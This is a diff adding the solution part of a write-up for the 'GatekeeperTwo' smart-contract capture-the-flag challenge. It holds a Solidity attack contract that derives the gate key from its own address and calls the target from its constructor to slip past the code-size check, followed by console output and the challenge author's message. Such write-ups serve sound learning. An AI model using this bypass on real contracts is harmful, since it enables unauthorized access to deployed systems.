@@ -67,5 +67,36 @@ It's important to note that the code uses low-level assembly and cryptographic o
 
 
 ```solidity
+pragma solidity ^0.8.17;
 
+import './GatekeeperTwo.sol';
+
+contract Attack{
+
+    GatekeeperTwo target;
+
+    constructor(address _target){
+        target = GatekeeperTwo(_target);
+        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
+        target.enter(gateKey);  
+    }
+}
 ```
+
+```shell
+await contract.entrant()
+'0x0000000000000000000000000000000000000000'
+```
+
+```shell
+await contract.entrant()
+'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
+```
+
+0age's,who is owner of the challenge, message:
+
+> Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).
+
+
+**_by wasny0ps_**
+
